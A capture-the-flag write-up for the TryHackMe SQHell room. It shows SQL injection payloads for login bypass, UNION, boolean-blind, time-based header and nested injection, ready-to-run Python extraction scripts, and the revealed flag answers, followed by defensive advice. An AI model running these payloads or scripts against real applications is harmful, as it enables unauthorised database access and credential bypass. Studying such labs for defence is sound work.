# TryHackMe: SQHell — Detailed Walkthrough & Writeup

**Room Link:** [TryHackMe - SQHell](https://tryhackme.com/room/sqhell)  
**Target IP:** `10.49.180.132` (adjust according to your lab instance)  
**Difficulty:** Medium  
**Category:** Web Application Security / SQL Injection  

---

## 1. Overview & Challenge Concept

SQHell is a dedicated web challenge designed to test your understanding of five distinct SQL Injection (SQLi) categories and methodologies. Rather than relying on a single vulnerability across the site, the author built a mock blog application where different application workflows interact with separate MySQL databases (`sqhell_1` through `sqhell_5`).

The five injection types featured in this room are:
1. **In-Band / Authentication Bypass** (Login form)
2. **HTTP Header / Second-Order or Stacked Queries Time-Based** (IP Logging via `X-Forwarded-For`)
3. **Boolean-Based Blind** (AJAX User Registration check)
4. **Nested SQL Injection ("A dream within a dream" / Inception)** (`/user?id=`)
5. **Classic In-Band UNION-Based** (`/post?id=`)

---

## 2. Reconnaissance & Initial Enumeration

### Port Scanning
We begin by running a service scan with `nmap`:

```bash
nmap -sV -sC -T4 10.49.180.132 -oN nmap.log
```

**Results:**
- **Port 22/tcp:** OpenSSH 8.2p1 (Ubuntu Linux)
- **Port 80/tcp:** nginx 1.18.0 (Ubuntu Linux)

### Web Application Analysis
Navigating to `http://10.49.180.132/` reveals a simple blog with:
- Blog posts on the home page (`/post?id=1`, `/post?id=2`)
- Author profile links (`/user?id=1`)
- A "Terms & Conditions" link in the footer (`/terms-and-conditions`)
- Navigation buttons for **Login** (`/login`) and **Register** (`/register`)

---

## 3. Flag Walkthroughs

---

### Flag 1: Authentication Bypass (Login Page)

#### Discovery
Visiting `/login` shows a standard username/password form submitting via `POST /login`:
```html
<form method="post">
    <div><input class="form-control" name="username"></div>
    <div><input type="password" class="form-control" name="password"></div>
    <input type="submit" class="btn btn-success pull-right" value="Login">
</form>
```

#### Exploitation
In classic vulnerable login implementations, the backend query resembles:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```
If we inject an `OR 1=1` statement or comment out the password check in the username field, the query evaluates to true.

We test using `curl`:
```bash
curl -s -X POST "http://10.49.180.132/login" \
  -d "username=admin' OR 1=1--+-&password=any"
```

#### Output
The application successfully authenticates and renders the logged-in dashboard:
```html
<div class="alert alert-success text-center" style="margin:10px">
    <p>THM{FLAG1:E786483E5A53075750F1FA792E823BD2}</p>
</div>
```

**Flag 1:** `THM{FLAG1:E786483E5A53075750F1FA792E823BD2}`

---

### Flag 5: Classic UNION-Based SQL Injection (`/post?id=`)

*(We solve Flag 5 early because it is a direct in-band parameter that reveals database conventions).*

#### Discovery
Viewing a blog post at `/post?id=1` presents article content. Testing a single quote:
```bash
curl -s "http://10.49.180.132/post?id=1'"
```
**Response:**
```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```
The MySQL error confirms direct, unescaped string/integer injection in the `id` GET parameter.

#### Determining Column Count
We determine the number of columns using `UNION SELECT`:
```bash
python3 -c "
import urllib.request, urllib.parse

base = 'http://10.49.180.132/post?id='
for n in range(1, 6):
    cols = ','.join(str(i) for i in range(1, n+1))
    url = base + urllib.parse.quote(f'0 UNION SELECT {cols}-- -')
    res = urllib.request.urlopen(url).read().decode()
    if 'different number of columns' not in res and 'Post not found' not in res:
        print(f'Valid column count: {n}')
"
```
Output: **4 columns**.

#### Checking Reflection Points
Testing which columns are reflected in the HTML:
```text
/post?id=0 UNION SELECT 1, 'COL2', 'COL3', 4-- -
```
- Column 2 reflects in the post title (`<div class="panel-heading">`).
- Column 3 reflects in the post body (`<div class="panel-body">`).

#### Extracting the Flag
As stated in the room hint, flags are placed in `flag.flag`:
```bash
curl -s "http://10.49.180.132/post?id=0%20UNION%20SELECT%201,2,flag,4%20FROM%20flag--%20-" | grep "THM{"
```

**Output:**
```html
<div class="panel-body">
    THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
</div>
```

**Flag 5:** `THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}`

---

### Flag 3: Boolean-Based Blind SQL Injection (`/register/user-check`)

#### Discovery
Navigating to `/register`, we notice the registration form is cosmetically disabled in the HTML frontend:
```html
<input type="button" onclick="alert('Registrations are no longer open')" class="btn btn-success pull-right" value="Register">
```
However, inspecting the embedded JavaScript reveals an active dynamic validation script:
```javascript
$('input[name="username"]').keyup(function(){
    $('.userstatus').html('');
    let username = $(this).val();
    $.getJSON('/register/user-check?username='+ username, function(resp){
        if( resp.available ){
            ...
        }
    });
});
```

#### Testing the Endpoint
We query `/register/user-check` directly:
```bash
# Existing user (admin):
curl -s "http://10.49.180.132/register/user-check?username=admin"
# Output: {"available":false}

# Non-existent user:
curl -s "http://10.49.180.132/register/user-check?username=nobody123"
# Output: {"available":true}
```

Now let's test SQL injection:
```bash
# Condition TRUE:
curl -s "http://10.49.180.132/register/user-check?username=admin'%20AND%201=1--%20-"
# Output: {"available":false}

# Condition FALSE:
curl -s "http://10.49.180.132/register/user-check?username=admin'%20AND%201=2--%20-"
# Output: {"available":true}
```
This is a textbook **Boolean-Based Blind** injection point:
- When our SQL condition is **True**, it returns `{"available":false}` (username `admin` found).
- When our SQL condition is **False**, it returns `{"available":true}` (no match).

#### Automation Script
We write a quick Python script to extract the flag character-by-character from `sqhell_3.flag`:

```python
import urllib.request
import urllib.parse

base_url = "http://10.49.180.132/register/user-check?username="
charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}:_-"

def check(payload):
    url = base_url + urllib.parse.quote(payload)
    with urllib.request.urlopen(url, timeout=5) as resp:
        return 'false' in resp.read().decode().lower()

# 1. Determine flag length
flag_length = 0
for length in range(1, 60):
    if check(f"admin' AND (SELECT LENGTH(flag) FROM flag LIMIT 1)={length}-- -"):
        flag_length = length
        print(f"[+] Flag length: {flag_length}")
        break

# 2. Extract flag characters
flag = ""
for pos in range(1, flag_length + 1):
    for ch in charset:
        if check(f"admin' AND SUBSTRING((SELECT flag FROM flag LIMIT 1),{pos},1)='{ch}'-- -"):
            flag += ch
            print(f"[{pos}/{flag_length}] -> {flag}")
            break

print(f"\n[+] Flag 3 Recovered: {flag}")
```

**Flag 3:** `THM{flag3:97aeb3b28a4864416718f3a5faf8f308}`

---

### Flag 2: HTTP Header Injection via Stacked Queries (`/terms-and-conditions`)

#### Discovery
The challenge description provides a deliberate hint:
> *"Hint: Make sure to read the terms and conditions ;)"*

Visiting `http://10.49.180.132/terms-and-conditions`, term (iii) states:
> *"iii: We log your IP address for analytics purposes"*

This hints that an HTTP request header typically representing the client's IP—such as `X-Forwarded-For`—is being captured and inserted into database `sqhell_1`.

#### Testing the Injection
Normal in-band or boolean-based queries in the header do not reflect on the page. However, testing **stacked queries** with MySQL's `SLEEP()` function yields an immediate result:

```bash
time curl -s -H "X-Forwarded-For: 10.10.10.1'; SELECT SLEEP(3)-- -" "http://10.49.180.132/terms-and-conditions"
```
The request takes **3.12 seconds** to return! This confirms stacked queries are enabled and executed sequentially.

Checking the database name:
```bash
# Verify it runs in sqhell_1:
curl -s -H "X-Forwarded-For: 10.10.10.1'; SELECT SLEEP(IF(database()='sqhell_1',3,0))-- -" "http://10.49.180.132/terms-and-conditions"
```
This delays for 3 seconds, proving the context is `sqhell_1`.

#### Automation Script
We write an automated script to extract Flag 2 using time-based blind logic:

```python
import urllib.request
import time

url = "http://10.49.180.132/terms-and-conditions"
charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}:_-"

def time_test(payload, sleep_sec=2):
    req = urllib.request.Request(url)
    req.add_header("X-Forwarded-For", payload)
    start = time.time()
    with urllib.request.urlopen(req, timeout=sleep_sec + 5) as resp:
        resp.read()
    return (time.time() - start) > (sleep_sec - 0.5)

# Extract 43-character flag
flag = ""
for pos in range(1, 44):
    for ch in charset:
        payload = f"10.10.10.1'; SELECT SLEEP(IF(SUBSTRING((SELECT flag FROM flag LIMIT 1),{pos},1)='{ch}',2,0))-- -"
        if time_test(payload, 2):
            flag += ch
            print(f"[{pos}/43] -> {flag}")
            break

print(f"\n[+] Flag 2 Recovered: {flag}")
```

**Flag 2:** `THM{flag2:c678abfe1c01fca19e03901cedab1d15}`

---

### Flag 4: Nested SQL Injection ("Inception") (`/user?id=`)

#### Discovery & Deciphering the Hint
The hint for Flag 4 references the movie *Inception*:
> *"Hint: Well, dreams, they feel real while we're in them right?"*

In *Inception*, the central theme is "a dream within a dream." In the context of SQL injection, this translates to **Nested SQL Injection (Second-Order Query Nesting)**.

#### Analyzing the Application Architecture
When visiting `/user?id=1`, the page renders two distinct blocks:
1. **User Details:**
   ```html
   <div><label>User ID:</label> 1</div>
   <div><label>Username:</label> admin</div>
   ```
2. **Posts by this User:**
   ```html
   <div><label>Posts:</label></div>
   <ul>
       <li><a href="/post?id=1">First Post</a></li>
       <li><a href="/post?id=2">Second Post</a></li>
   </ul>
   ```

How does the backend retrieve this?
- **Query 1:** `SELECT id, username, password FROM users WHERE id = <input>`
- The backend takes the resulting `id` from Query 1 and directly strings it into **Query 2**:
  ```sql
  SELECT id, title, content, user_id FROM posts WHERE user_id = <User ID returned from Query 1>
  ```

#### Verifying the Nested Vulnerability
If we control what Query 1 returns for `id`, we can inject arbitrary SQL into Query 2!

We test this by passing a UNION query into `/user?id=`:
```text
/user?id=0 UNION SELECT 1, 'admin', 3-- -
```
Result: Displays posts for `user_id = 1`.

Now change the returned `id` to `999`:
```text
/user?id=0 UNION SELECT 999, 'admin', 3-- -
```
Result: The posts section is completely empty.

#### Crafting the Inner Query
Because Query 2 takes the `User ID` literally, what happens if our first query returns a secondary `UNION SELECT` statement as the User ID?
```text
Query 1 Output for ID: 0 UNION SELECT 1, 2, 3, 4-- -
Query 2 Becomes:       SELECT id, title FROM posts WHERE user_id = 0 UNION SELECT 1, 2, 3, 4-- -
```

Let's test this in Python:
```python
import urllib.request, urllib.parse

payload = '0 UNION SELECT "0 UNION SELECT 1, 2, 3, 4-- -", 2, 3-- -'
url = 'http://10.49.180.132/user?id=' + urllib.parse.quote(payload)
resp = urllib.request.urlopen(url).read().decode()
print(resp[resp.find('panel-body'):resp.find('panel-body')+400])
```

**Output:**
```html
<div class="panel-body">
    <div><label>User ID:</label>&nbsp;&nbsp;0 UNION SELECT 1, 2, 3, 4-- -</div>
    <div><label>Username:</label>&nbsp;&nbsp;2</div>
    <div><label>Posts:</label></div>
    <ul>
        <li><a href="/post?id=1">2</a></li>
    </ul>
```
The nested query executed inside the second query! Column 2 corresponds to the post title reflected in `<a>`.

#### Retrieving the Flag
Now, we simply substitute Column 2 in the inner query with `(SELECT flag FROM flag LIMIT 1)`:

```text
/user?id=0 UNION SELECT "0 UNION SELECT 1, (SELECT flag FROM flag LIMIT 1), 3, 4-- -", 2, 3-- -
```

Using `curl`:
```bash
curl -s "http://10.49.180.132/user?id=0%20UNION%20SELECT%20%220%20UNION%20SELECT%201,%20(SELECT%20flag%20FROM%20flag%20LIMIT%201),%203,%204--%20-%22,%202,%203--%20-" | grep "THM{"
```

**Output:**
```html
<li><a href="/post?id=1">THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}</a></li>
```

**Flag 4:** `THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}`

---

## 4. Summary Table of All Flags

| # | Challenge | Vulnerability Type | Vulnerable Vector / Endpoint | Flag Value |
|---|---|---|---|---|
| **1** | Flag 1 | Authentication Bypass (In-Band) | `POST /login` (`username`) | `THM{FLAG1:E786483E5A53075750F1FA792E823BD2}` |
| **2** | Flag 2 | Header Injection (Stacked Queries) | `GET /terms-and-conditions` (`X-Forwarded-For`) | `THM{flag2:c678abfe1c01fca19e03901cedab1d15}` |
| **3** | Flag 3 | Boolean-Based Blind | `GET /register/user-check?username=` | `THM{flag3:97aeb3b28a4864416718f3a5faf8f308}` |
| **4** | Flag 4 | Nested Injection (Inception) | `GET /user?id=` | `THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}` |
| **5** | Flag 5 | UNION-Based In-Band | `GET /post?id=` | `THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}` |

---

## 5. Key Takeaways & Defense Recommendations

1. **Parameterize Every Query Layer:**
   - In Flag 4, the developer might have parameterized the first query (or thought it safe), but concatenating its output into subsequent queries introduced nested second-order injection. Always use prepared statements for all queries.
2. **Never Trust HTTP Headers:**
   - Headers like `X-Forwarded-For`, `User-Agent`, and `Referer` are user-controlled input and must be treated with the same validation and parameterized queries as form inputs.
3. **Use Prepared Statements for AJAX Endpoints:**
   - Background API endpoints (like username availability checks) are frequent blind spots for penetration testers and attackers alike.
4. **Disable Multi-Query Execution:**
   - Disabling stacked query execution (`multi_query` in PHP/MySQLi) limits an attacker's ability to execute arbitrary second statements during header logging.
